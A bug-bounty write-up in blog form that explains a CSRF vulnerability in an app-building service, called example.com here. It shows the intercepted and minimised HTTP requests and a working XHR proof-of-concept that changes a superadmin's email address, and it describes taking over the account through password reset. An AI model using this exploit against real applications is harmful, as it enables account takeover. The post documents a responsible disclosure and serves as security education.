---
layout: post
title: Compromise complete application with CSRF attack
---

I was looking for responsible disclosure programs and came across a program, let's call it example.com

I started enumeration, the website is basically used to create applications which will be deployed as a subdomain on the website domain, like if I created an application test then URL to the application will be https://test.example.com
<!--more-->
I created an application that has URL https://test.example.com/, the first thing that I noticed is there was no Email verification

During enumeration, I came across the Profile update page from where the user’s name can be changed but Email field was disabled on the frontend

When I intercepted the request the email parameter was there and from that, the email can be successfully updated but it is very low impact vulnerability so I keep looking on the website

On the same request, I found that there was no CSRF token, before creating a CSRF POC and testing, I started minimizing the request parameters, The request had Content-Type: multipart/form-data, and had JSON data

## Initial Request
```
POST /server/api/users/1 HTTP/1.1
Host: test.example.com
Connection: close
Content-Length: 2298
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY0xsvHS604Lx0QVR
Origin: https://test.example.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://test.example.com/client/app/build/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: --COOKIES HERE--

------WebKitFormBoundaryY0xsvHS604Lx0QVR
Content-Disposition: form-data; name="model"

{"id":"1","client_id":null,"user_type":"superadmin","company_name":null,"first_name":"Test1","last_name":"test","address_1":null,"address_2":null,"city":null,"state":null,"zip":null,"phone":null,"email":"test@test.com","cluster_id":null,"external_user_id":null,"additional_details_1":null,"additional_details_2":null,"additional_details_3":null,"enable_io_tool_module":false,"enable_lead_management_module":false,"lead_notification_frequency":"real_time","has_light_logo":false,"has_dark_logo":false,"default_home_page":null,"io_tool_notification_frequency":null,"country":null,"timezone":null,"status":"active","hipaa_acknowledgement_timestamp":null,"creation_time":1590667071,"report_language":null,"last_login_timestamp":1590667155,"show_welcome_modal":true,"show_services_overview":"default","show_categories_overview":"default","role_id":null,"io_tool_role_id":null,"client_group_id":null,"reporting_profile_id":"1","client_name":null,"client_reporting_status":null,"cluster_name":null,"override_dashboard_page_ids":null,"role_name":null,"client_group_name":null,"reporting_profile_name":"Default Profile","user_image_id":"7163","user_image_metadata":{"asset_id":"9c356861ae9896fe449102b0ba4ec207","public_id":"test/lwlwwyjdvzpmwwnqnr4g","version":1590667197,"version_id":"bb39724d650bd6495eb44b8d845b989f","signature":"04db16438eb5c620e22aa692d0f946e2cf2d07cf","width":64,"height":64,"format":"png","resource_type":"image","created_at":"2020-05-28T11:59:57Z","tags":[],"bytes":341,"type":"upload","etag":"d6b69986122a6445c9614dcbe5ea83b1","placeholder":false,"url":"http://res.cloudinary.com/tapclicks/image/upload/v1590667197/test/lwlwwyjdvzpmwwnqnr4g.png","secure_url":"https://res.cloudinary.com/tapclicks/image/upload/v1590667197/test/lwlwwyjdvzpmwwnqnr4g.png"},"user_type_display":"Super Admin","display_name":"Test test","lead_notification_frequency_display":"Real Time","status_display":"Active","timegroup":"hourly","formatted_creation_time":"May 28, 2020 11:57 AM","formatted_last_login_timestamp":"May 28, 2020 11:59 AM","can_be_edited":true,"can_be_deleted":false,"can_be_copied":false,"can_be_deleted_tooltip":null,"user_id":"1"}
------WebKitFormBoundaryY0xsvHS604Lx0QVR--
```

## Minimized Request
```
POST /server/api/users/1 HTTP/1.1
Host: test.example.com
Connection: close
Content-Length: 281
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryY0xsvHS604Lx0QVR
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,hi;q=0.8
Cookie: --COOKIES HERE--

------WebKitFormBoundaryY0xsvHS604Lx0QVR
Content-Disposition: form-data; name="model"

{"id":"1","user_type":"superadmin","first_name":"Test1","last_name":"test","email":"test4@test.com","status":"active","reporting_profile_id":"1"}
------WebKitFormBoundaryY0xsvHS604Lx0QVR--
```

Then I created a POC code for exploiting thing with [XHR](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest)

## CSRF POC
```html
<script>
   function submitRequest()
   {
     var xhr = new XMLHttpRequest();
     xhr.open("POST", "https://test.example.com/server/api/users/1", true);
     xhr.setRequestHeader("Accept", "application/json, text/plain, */*");
     xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
     xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryY0xsvHS604Lx0QVR");
     xhr.withCredentials = true;
     var body = "------WebKitFormBoundaryY0xsvHS604Lx0QVR\r\n" + 
       'Content-Disposition: form-data; name="model"\r\n\r\n'+
       '{"id":"1","user_type":"superadmin","first_name":"Test1","last_name":"test","email":"testing123@test.com","status":"active","reporting_profile_id":"1"}\r\n'+
       "------WebKitFormBoundaryY0xsvHS604Lx0QVR--\r\n";
     var aBody = new Uint8Array(body.length);
     for (var i = 0; i < aBody.length; i++)
       aBody[i] = body.charCodeAt(i); 
     xhr.send(new Blob([aBody]));
   }
</script>
<form action="#">
   <input type="button" value="Submit request" onclick="submitRequest();" />
</form>
```

Opened this CSRF POC in the same browser where the user is logged in, and click on Submit and the user email will be updated to testing123@test.com

After that, the password can be changed with the Forgot Password function and as the POC is for superadmin the complete application can be compromised

## List of Vulnerability helped in Exploitation

* No email verification

* Improper Validation on Server site — Email Update

* No Cross-Site Requests Forgery Protection — Anti CSRF token missing
